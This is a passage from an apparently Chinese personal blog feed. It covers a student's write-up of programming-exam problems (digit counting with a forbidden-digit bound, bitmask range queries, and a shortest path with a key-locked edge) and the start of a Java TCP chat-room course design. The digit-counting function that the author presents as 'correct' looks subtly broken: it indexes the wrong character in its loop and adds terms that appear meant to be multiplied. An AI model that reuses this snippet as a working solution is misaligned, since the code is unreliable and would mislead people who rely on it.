long存储，然后如果直接枚举，肯定会超时，这里可以首先分析n是几位数，如果是之前的话可能要写一个函数判断，但是之前学了一个技巧，先将其转化字符串，然后判断这个字符串的长度，就是n的位数，记为<code>num</code>。</p><p>然后分析$ 1 \sim num - 1$位数中有多少个数满足要求：由于$[k, 9]$之间的数字不能出现，因此每一位只有$[0,k-1]$个选法，注意最高位不能为0，所以最高位只有k-1中选法，其他有k中选法，这也就是get函数的作用。</p><p>当判断<code>num</code>位数中，有多少个是小于n的（写到这里的时候突然发现考试虽然过了部分数据，但是这里应该是不对的），比如n是22，k为9，此时可以取18，但是下面的写法是没有计算18的，所以错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line">LL n; </span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">get</span><span class="params">(<span class="type">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// num位数</span></span><br><span class="line">    <span class="comment">// 最高位 k - 1 个选择 其他位置上的数都有 k 个选择</span></span><br><span class="line">    <span class="keyword">return</span> (k - <span class="number">1</span>) * <span class="built_in">pow</span>(k, num - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">calu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 此时位数与n相同</span></span><br><span class="line">    <span class="comment">// 从最高位开始判断 每次只能从n的当前这位的数a和k-1的较小值中选择</span></span><br><span class="line">    string num = <span class="built_in">to_string</span>(n);</span><br><span class="line">    LL res = <span class="built_in">min</span>(num[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>, k - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; num.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="built_in">min</span>(num[i] - <span class="string">&#x27;0&#x27;</span> + <span class="number">1</span>, k);</span><br><span class="line">        res *= t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="comment">// 判断每一个位置有多少个可以选</span></span><br><span class="line">    LL ans = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 先得到n是几位数</span></span><br><span class="line">    <span class="type">int</span> num = <span class="built_in">to_string</span>(n).<span class="built_in">size</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断i位数有多少个数可以选</span></span><br><span class="line">        ans += <span class="built_in">get</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 单独处理num位数的情况</span></span><br><span class="line">    ans += <span class="built_in">calu</span>();</span><br><span class="line">    cout &lt;&lt; ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= t; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">work</span>();</span><br><span class="line">        <span class="keyword">if</span> (i &lt; t) cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面的做法是正确的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LL <span class="title">calu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 此时位数与n相同</span></span><br><span class="line">    <span class="comment">// 从最高位开始判断 每次只能从n的当前这位的数a和k-1的较小值中选择</span></span><br><span class="line">    string num = <span class="built_in">to_string</span>(n);</span><br><span class="line">    <span class="type">int</span> cnt = num.<span class="built_in">size</span>();</span><br><span class="line">    LL res = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (num[<span class="number">0</span>] &gt; <span class="string">&#x27;1&#x27;</span>) res += (<span class="built_in">min</span>(num[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span> - <span class="number">1</span>, k - <span class="number">1</span>) - <span class="number">1</span>) + <span class="built_in">pow</span>(k, cnt - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; num.<span class="built_in">size</span>(); i++)</span><br><span class="line">        <span class="keyword">if</span> (num[i] &gt;= <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            res += (<span class="built_in">min</span>(num[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>, k) - <span class="number">1</span>) + <span class="built_in">pow</span>(k, cnt - i - <span class="number">1</span>);</span><br><span class="line">    res ++;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="4-题目D：掩码匹配"><a href="#4-题目D：掩码匹配" class="headerlink" title="4 题目D：掩码匹配"></a>4 题目D：掩码匹配</h1><h2 id="4-1-题目描述"><a href="#4-1-题目描述" class="headerlink" title="4.1 题目描述"></a>4.1 题目描述</h2><p>数字在计算机中是以二进制存储的，小Z在监控程序运行状态。他想知道给定一个掩码，一段内存中有多少个数可以匹配该掩码。</p><p>匹配定义：待匹配数为a，掩码为b，若b的二进制表示中所有的1，在a的二进制表示的相对应位置也为1，则称a可以匹配掩码b。</p><p>例如，1为掩码，其二进制表示为”1”，则1(1)，3(11)，5(101)，7(111)，……均可匹配该掩码，括号内为该数字对应二进制表示。</p><p>又例如，13的二进制为”1101”，如果掩码为12，12的二进制为”1100”,掩码12可以匹配数字13。同时该掩码也可以匹配数字15(1111)。</p><p>为了简化问题，小Z所有的掩码保证二进制下1的个数不超过2个。</p><h2 id="4-2-输入"><a href="#4-2-输入" class="headerlink" title="4.2 输入"></a>4.2 输入</h2><p>第一行包含一个整数n，表示观测的内存长度，编号从1到n。</p><p>第二行包含n个整数表示内存中存储的数。</p><p>第三行包含一个整数q表示询问数量。</p><p>接下来q行每行包含三个整数s t m，表示从位置s到位置t，掩码为m。</p><p>数据范围：</p><ul><li>$1 \leq n \leq 20000$</li><li>$1 \leq q \leq 100000$</li><li>$m &gt; 0$且保证二进制下至多两位为1</li><li>内存中储存的数字范围为$[1, 10^8]$</li></ul><h2 id="4-3-输出"><a href="#4-3-输出" class="headerlink" title="4.3 输出"></a>4.3 输出</h2><p>对于每次询问，输出一个整数表示从到s到t（包含起点和终点），可有多少数字可以匹配掩码m。</p><h2 id="4-4-样例输入"><a href="#4-4-样例输入" class="headerlink" title="4.4 样例输入"></a>4.4 样例输入</h2><blockquote><p>8<br>1 2 3 4 5 6 7 8<br>3<br>1 8 3<br>1 8 1<br>3 8 6</p></blockquote><h2 id="4-5-样例输出"><a href="#4-5-样例输出" class="headerlink" title="4.5 样例输出"></a>4.5 样例输出</h2><blockquote><p>2<br>4<br>2</p></blockquote><p>对于询问1，区间[1, 8]内3和7可以匹配掩码3。</p><p>对于询问2，区间[1, 8]内[1, 3, 5, 7]可以匹配掩码1。</p><p>对于询问3，区间[3, 8]内6和7可以匹配掩码6。</p><h2 id="4-6-解题思路"><a href="#4-6-解题思路" class="headerlink" title="4.6 解题思路"></a>4.6 解题思路</h2><p>当时做的时候直接使用的暴力，样例可以通过，但是剩下的测试数据中肯定会超时，所以最后又想了一个优化，但是没有时间了。</p><p>可以将输入的数据进行预处理，类似桶排序的思想，预处理出来一个数的二进制中哪些位为1，然后将这些数保存在对应的桶中，之后直接查询即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">20010</span>;</span><br><span class="line"><span class="type">int</span> mem[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n; cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) cin &gt;&gt; mem[i];</span><br><span class="line">  </span><br><span class="line">    <span class="type">int</span> q; cin &gt;&gt; q;</span><br><span class="line">    <span class="keyword">while</span> (q--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> st, ed, m; cin &gt;&gt; st &gt;&gt; ed &gt;&gt; m;</span><br><span class="line">    </span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = st; i &lt;= ed; i++)</span><br><span class="line">            <span class="keyword">if</span> ((mem[i] &amp; m) == m) ans++;</span><br><span class="line">        cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="5-题目E：更短的最短路"><a href="#5-题目E：更短的最短路" class="headerlink" title="5 题目E：更短的最短路"></a>5 题目E：更短的最短路</h1><h2 id="5-1-题目描述"><a href="#5-1-题目描述" class="headerlink" title="5.1 题目描述"></a>5.1 题目描述</h2><p>小Z在处理一个特殊的最短路径问题，在无向图中有部分边在最初始时是上锁没法通过的，当他拿到位于节点k的钥匙后，这些边就可以通过了。</p><p>通过一条边的花费为边权值，他想知道从节点1走到节点n的最小花费是多少。</p><h2 id="5-2-输入"><a href="#5-2-输入" class="headerlink" title="5.2 输入"></a>5.2 输入</h2><p>多组样例输入，第一行输入一个整数T表示样例数。</p><p>对于每个样例，第一行包含两个整数n，m，k， 图一共n个节点m条边，节点编号从<br>到1到n，钥匙在节点k。</p><p>接下来行每行包含四个整数，s t w v表示有一条从s到t的边，权重为w，如果v为0则表示不需要钥匙就可以通行，如果是1则表示该边需要拿到钥匙后才能通行。</p><h2 id="5-3-输出"><a href="#5-3-输出" class="headerlink" title="5.3 输出"></a>5.3 输出</h2><p>对于每组样例，输出一个整数表示从1到n的最短路，如果不能到达，则输出-1。</p><h2 id="5-4-样例输入"><a href="#5-4-样例输入" class="headerlink" title="5.4 样例输入"></a>5.4 样例输入</h2><blockquote><p>2<br>3 3 1<br>1 2 1 0<br>2 3 1 0<br>1 3 5 0<br>4 4 3<br>1 3 1 0<br>1 2 1 0<br>2 4 1 1<br>3 4 100 0</p></blockquote><h2 id="5-5-样例输出"><a href="#5-5-样例输出" class="headerlink" title="5.5 样例输出"></a>5.5 样例输出</h2><blockquote><p>2<br>4</p></blockquote><h2 id="5-6-解题思路"><a href="#5-6-解题思路" class="headerlink" title="5.6 解题思路"></a>5.6 解题思路</h2><p>需要思考的问题是这个与以往的最短路问题有什么不同？有一个钥匙的限制。</p><p>先判断是否可以只走不需要钥匙的边到达终点</p><ol><li>可以：需要先计算获得钥匙，然后再从钥匙所在点走到终点的代价的最小值</li><li>不可以：需要先计算获得钥匙，然后再从钥匙所在点走到终点的代价</li></ol><p>综上：最小代价就是不需要钥匙和需要钥匙的最小代价。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> n, m, k;</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; g[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">dijkstra</span><span class="params">(<span class="type">int</span> source, <span class="type">bool</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    <span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">    dist[source] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j])) t = j;</span><br><span class="line">        st[t] = <span class="literal">true</span>;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">          <span class="keyword">if</span> (key || (!key &amp;&amp; g[t][j].second == <span class="number">0</span>))</span><br><span class="line">              dist[j] = <span class="built_in">min</span>(dist[j], dist[t] + g[t][j].first);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dist[n] &gt; <span class="number">0x3f3f3f3f</span> / <span class="number">2</span> ? <span class="number">-1</span> : dist[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(g, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;</span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> s, t, w, v; cin &gt;&gt; s &gt;&gt; t &gt;&gt; w &gt;&gt; v;</span><br><span class="line">        g[s][t] = &#123; w, v &#125;, g[t][s] = &#123; w, v &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    LL ans1 = <span class="built_in">dijkstra</span>(<span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (ans1 == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 没有钥匙不能到达</span></span><br><span class="line">        <span class="comment">// 不能拿到钥匙</span></span><br><span class="line">        <span class="keyword">if</span> (dist[k] &gt; <span class="number">0x3f3f3f3f</span> / <span class="number">2</span>) cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> dist_k = dist[k];</span><br><span class="line">            <span class="comment">// 能拿到钥匙</span></span><br><span class="line">            LL ans2 = <span class="built_in">dijkstra</span>(k, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (ans2 == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 拿到钥匙也不能到达</span></span><br><span class="line">                cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> cout &lt;&lt; dist_k + ans2 &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">// 需要看一下拿到钥匙是否能有更近的路径</span></span><br><span class="line">          <span class="type">int</span> dist_k = dist[k];</span><br><span class="line">          LL ans2 = <span class="built_in">dijkstra</span>(k, <span class="literal">true</span>);</span><br><span class="line">          cout &lt;&lt; <span class="built_in">min</span>(ans1, dist_k + ans2) &lt;&lt; endl;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">        <span class="built_in">work</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h1><p>已经参加了好几个机试了，感觉最重要的是在考试的时候保持思路的清晰，一定要考虑好边界情况，有的考试其实并不是一定考核你的算法能力，题目并不难，但是一定要考虑全面。</p><p>这次感觉第3题有些可惜，其次第4题明明可以优化，但是没时间了，花费挺多时间在第5题上了。</p><p>另外一定要背熟模板，像这次的迪杰斯特拉算法其实就是忘了一部分，考场上现写的，所以还是要加强模板的掌握，其次写代码的时候一定要保证写一个就对一个，不要指着debug找错误。</p><p>下一步需要加强的地方：</p><ol><li>加强记忆模板</li><li>练习的时候尽量不看测试用例，自己先想哪里错了</li><li>将题目和自己做过的题进行类比，看有哪些相同的地方</li><li>考虑问题要全面，做题的时候就要像可能会有哪些临界情况</li></ol>]]></content>
      
      
      <categories>
          
          <category> 保研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机考 </tag>
            
            <tag> 算法题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网课设：基于TCP协议的简历聊天室程序设计</title>
      <link href="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
      <url>/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-题目要求"><a href="#1-题目要求" class="headerlink" title="1 题目要求"></a>1 题目要求</h1><p>设计题目：基于TCP协议的简易聊天室程序设计</p><p>设计要求：使用<strong>Java</strong>编程语言，设计并实现一个基于TCP协议的简易聊天室程序。</p><p>程序包括<strong>服务器端和多个客户端</strong>，客户端能够连接到服务器并实现实时的聊天功能。</p><p>实现基本的用户登录、消息发送和接收功能。</p><hr><h1 id="2-整体架构设计"><a href="#2-整体架构设计" class="headerlink" title="2 整体架构设计"></a>2 整体架构设计</h1><p>在线聊天室程序通常采用客户端-服务器（C&#x2F;S）架构设计如图3.1所示，其中服务器端负责管理用户连接、消息传递和群聊管理等核心功能，而客户端则提供用户界面，允许用户登录、发送消息和接收其他用户消息。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_a4pQVSRyGa.png"></p><center>图3.1  TCP聊天室系统架构图</center><p>当设计一个聊天室程序时，除了客户端-服务器（C&#x2F;S）架构外，通常还涉及到服务器与数据库的交互部分。服务器需要与数据库交互来存储用户的用户名和账号信息。</p><h2 id="2-1-服务器端设计"><a href="#2-1-服务器端设计" class="headerlink" title="2.1 服务器端设计"></a>2.1 服务器端设计</h2><p>在日常生活中，服务器通常要同时接收来自客户端的多个请求，需要同时为这些客户端提供它们想要的服务，因此服务器端通常采用多线程或异步IO等技术，以支持多个客户端同时连接和消息处理。</p><p>在此次课程设计任务中，服务器实现的核心功能列举如下：</p><ol><li><strong>接受和管理连接：</strong>服务器通过绑定到特定端口的ServerSocket监听客户端连接请求，每当有新的连接请求时，创建一个新的线程用于处理服务器与该客户端的连接。</li><li><strong>用户认证：</strong>每当有客户端发出登录请求时，服务器需要验证客户端提供的用户名和密码是否存在以及是否正确，以确保用户身份的安全性和合法性。</li><li><strong>消息接收和转发：</strong>当用户登录成功之后，需要和其他用户发送消息，此时服务器需要接收来自客户端的消息，根据目标用户或聊天室的不同，将消息发送给特定的客户端或所有连接的客户端（群发）。</li><li><strong>用户管理：</strong>维护当前所有在线用户的状态，管理用户的发言权，当发现用户出现在聊天中使用言语或行为对其他用户进行恶意攻击时等行为时，应当对其进行禁言处理或者强制下线处理，防止对其他用户造成影响，也可以对指定用户解除禁言。</li><li><strong>消息日志：</strong>日志记录可以帮助开发人员追踪和诊断服务器或客户端的问题。同时掌握每个客户端的行为，了解用户行为模式和使用习惯，从而优化产品功能和用户体验。</li></ol><h2 id="2-2-客户端设计"><a href="#2-2-客户端设计" class="headerlink" title="2.2 客户端设计"></a>2.2 客户端设计</h2><p>客户端主要用于处理用户的请求，以及与服务器端进行信息的交互，并且客户端的用户界面设计应考虑到用户友好性和操作便捷性，客户端实现的核心功能如下：</p><ol><li><strong>登录功能：</strong>登录界面主要为用户提供输入用户名和密码进行登录，用户点击登录后将登录信息发送给服务器，以进行用户身份的核验。</li><li><strong>聊天功能：</strong>聊天功能是这个设计过程中最重要的部分，用户在成功登录后，进入聊天界面，可以和当前其他的在线用户进行群聊或者进行私聊，以及确保用户可以即时地接收到其他用户发送的消息，并在界面上实时显示。</li></ol><h2 id="2-3-数据库设计"><a href="#2-3-数据库设计" class="headerlink" title="2.3 数据库设计"></a>2.3 数据库设计</h2><p>在本次课程设计任务中，使用MySQL数据库来存储用户的登录信息，包括用户名和对应的密码。具体实现是通过创建一个名为user的表来完成，该表包含两个主要列，分别用于存储用户名（username）和密码（password）。这样设计的主要目的是在用户登录时能够有效地验证其身份信息。</p><hr><h1 id="3-TCP协议"><a href="#3-TCP协议" class="headerlink" title="3 TCP协议"></a>3 TCP协议</h1><p>当一个用户给其他用户发送消息时，应保证消息的完整性，因此在传输层采用TCP协议实现可靠传输。TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层协议。它是互联网协议套件中最核心的协议之一，确保了数据在网络中的可靠传输。</p><h2 id="3-1-面向连接"><a href="#3-1-面向连接" class="headerlink" title="3.1 面向连接"></a>3.1 面向连接</h2><p>在通信之前，TCP需要先建立连接，这包括3次握手过程（SYN、SYN-ACK、ACK），确保通信双方能够彼此确认并准备好数据传输。在用户聊天结束后应该释放连接。TCP协议通过4次握手释放连接，确保双方安全地关闭连接，避免数据丢失或冗余传输。</p><h2 id="3-2-TCP连接的端点是Socket"><a href="#3-2-TCP连接的端点是Socket" class="headerlink" title="3.2 TCP连接的端点是Socket"></a>3.2 TCP连接的端点是Socket</h2><p>每一条TCP连接唯一地被通信两端的两个套接字（Socket）所确定。每一个Socket由主机的IP地址和端口号构成，其中IP地址用来在整个互联网中标识一个主机，端口号用于在一个主机的若干进程中标识指定的进程。通过Socket，同一主机、不同主机的应用进程之间可以通过不同的端口号进行通信。TCP协议确保了数据传输的可靠性和安全性。</p><hr><h1 id="4-通信消息格式设计"><a href="#4-通信消息格式设计" class="headerlink" title="4 通信消息格式设计"></a>4 通信消息格式设计</h1><p>在设计服务器和客户端之间的通信消息格式时，重要的考虑因素包括消息的结构化、易解析性和扩展性。因此将通信的消息分为消息头和消息体部分，消息头用于标识消息的用途或操作类型，类型为字符串（String）；消息体是实际传输的数据载荷，类型为字符串（String）。</p><h2 id="4-1-消息头"><a href="#4-1-消息头" class="headerlink" title="4.1 消息头"></a>4.1 